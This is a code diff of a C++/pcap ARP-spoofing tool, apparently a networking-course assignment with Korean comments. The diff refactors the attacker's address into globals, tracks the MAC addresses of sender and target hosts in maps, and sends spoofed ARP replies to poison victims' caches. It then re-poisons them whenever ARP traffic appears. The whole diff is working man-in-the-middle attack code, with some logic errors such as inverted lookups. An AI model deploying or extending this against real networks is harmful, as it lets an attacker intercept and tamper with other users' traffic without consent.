@@ -18,15 +18,9 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
-struct Network{
-	Mac mac;
-	Ip ip;
-};
-
-struct Netpair{
-	pair<Ip,Mac> send;
-	pair<Ip,Mac> tar;
-};
+// attacker's address 전역변수
+Mac attackerMac;
+Ip attackerIp;
 
 pcap_t* handle;
 
@@ -36,7 +30,7 @@ void usage() {
 }
 
 //Get sender's Mac
-Mac send_arp(Mac attackerMac, Ip attackerIp, Ip targetIp){
+Mac send_arp_normal(Ip targetIp){
 	EthArpPacket packet; //arp request packet
 
 	//sender = ma, target = victim
@@ -85,11 +79,11 @@ Mac send_arp(Mac attackerMac, Ip attackerIp, Ip targetIp){
 		if(arp_hdr->sip()!=targetIp) continue;
 		return Mac(static_cast<string>(arp_hdr->smac()));	
 	}
-	return NULL;
+	return Mac();
 }
 
 //send arp-spoof packet
-void send_arp_spoof(Mac attackerMac, Ip attakcerIp, Mac senderMac, Ip senderIp, Ip targetIp){
+void send_arp_spoof(Mac senderMac, Ip senderIp, Ip targetIp){
 	EthArpPacket packet;
 	packet.eth_.smac_ = attackerMac;
 	packet.eth_.dmac_ = senderMac;
@@ -137,44 +131,33 @@ int main(int argc, char* argv[]) {
 	// address init
 	string interface = interf;
 
-	Network attacker;
-	attacker.mac = get_mac(interface);
-	attacker.ip = get_ip(interface);
+	// Network, ARPEntry 
+	map<Ip, Mac> Network;
+	map<Ip, Ip> ARPEntry;
 
-	// store sender/target's mac-ip
-	map<Ip, Mac> ARPentry;
-	// store sender-target pair
-	struct Netpair Netarr [int(argc/2)];
+	attackerMac = get_mac(interface);
+	attackerIp = get_ip(interface);
+	Network.insert(make_pair(attackerIp, attackerMac));
 
 	// Process each (Sender, Target) pair
 	for (int i = 2; i < argc; i += 2) {
-		Netpair n;
-
 		Ip senderIp = Ip(argv[i]);      // Sender IP
-		//ARPentry에 있는 IP인지 확인
-		if(ARPentry.find(senderIp)!=ARPentry.end()){
-			Mac senderMac = send_arp(attacker.mac, attacker.ip, senderIp);
-			ARPentry.insert(pair<Ip,Mac>(senderIp, senderMac));
+		//ARPEntry에 있는 IP인지 확인
+		if(Network.find(senderIp)!=Network.end()){
+			Mac senderMac = send_arp_normal(senderIp);
+			Network.insert(make_pair(senderIp, senderMac));
 		}
-		//Netpair's sender
-		n.send.first = senderIp;
-		n.send.second = ARPentry[senderIp];
 
-		
 		Ip targetIp = Ip(argv[i + 1]); // Target IP
-		//ARPentry에 있는 IP인지 확인
-		if(ARPentry.find(targetIp)!=ARPentry.end()){
-			Mac targetMac = send_arp(attacker.mac, attacker.ip, targetIp);
-			ARPentry.insert(pair<Ip,Mac>(targetIp, targetMac));
+		//ARPEntry에 있는 IP인지 확인
+		if(Network.find(targetIp)!=Network.end()){
+			Mac targetMac = send_arp_normal(targetIp);
+			Network.insert(make_pair(targetIp, targetMac));
 		}
-		//Netpair's target
-		n.tar.first = targetIp;
-		n.tar.second = ARPentry[targetIp];
 
-		//순서대로 Netarr에 저장
-		Netarr[int(i/2)]=n;
+		ARPEntry.insert(make_pair(senderIp, targetIp));
 
-		send_arp_spoof(attacker.mac, attacker.ip, ARPentry[senderIp], senderIp, targetIp);
+		send_arp_spoof(Network[senderIp], senderIp, targetIp);
 	}
 
 	while(true){
@@ -199,18 +182,43 @@ int main(int argc, char* argv[]) {
 
 		// check packet
 		const EthArpPacket* eth_arp_pkt = reinterpret_cast<const EthArpPacket*>(cap_packet);
+
+		// ARP 패킷
+		if (ntohs(eth_arp_pkt->eth_.type_) == EthHdr::Arp){
+			const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
+			// if sender and target ip not in the Network 
+
+			Ip senderIp = arp_hdr->sip();
+			Mac senderMac = Network[senderIp];
+			Ip targetIp = arp_hdr->tip();
+
+			if(Network.find(senderIp)==Network.end() && Network.find(targetIp)==Network.end()) continue;
+
+			// sip가 센더로 저장되어있고 tip가 센더에 해당되는 ip가 아니라면 continue
+			// sip가 제대로 통신할 수 있도록 ARP 리퀘스트는 해야함
+			if(Network.find(senderIp)!=Network.end() && ARPEntry[senderIp]!=targetIp) continue;
+		
+			// sip가 센더혹은 타겟이면서 sip가 센더일 때 tip가 센더의 타켓이 아닌 패킷만 남음
+			// 타겟의 ARP 받으면 무조건 ARP 날리기	
+
+			send_arp_spoof(Network[senderIp], senderIp,targetIp);
+		}
+
+		//ARP가 아닌데 sip가 센더Ip면
+
 	
 		//check ARP Packet
 		if (ntohs(eth_arp_pkt->eth_.type_) != EthHdr::Arp) continue;
 		const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
 
 		// 공격 대상의 sender의 ARP 패킷이면
-		// 센더 -> 타겟 브로드 relay
-		if(ARPentry.find(arp_hdr->sip())==ARPentry.end()) continue;
-		Ip senderIp = arp_hdr->sip();
-		Ip tarIp = arp_hdr->tip();
-		send_arp_spoof(attacker.mac, attacker.ip, ARPentry[senderIp], senderIp, targetIp);
-		// return Mac(static_cast<string>(arp_hdr->smac()));
+		// 센더 - 어택 -> 타겟 브로드 relay
+		// if(ARPEntry.find(Network.find(arp_hdr->sip()))==ARPEntry.end()) continue;
+		// Ip senderIp = arp_hdr->sip();
+		// Ip targetIp = arp_hdr->tip();
+		// //send_arp_spoof(attackerMac, attackerIp, ARPEntry[senderIp], senderIp, targetIp);
+		
+
 	}
 
 	pcap_close(handle);
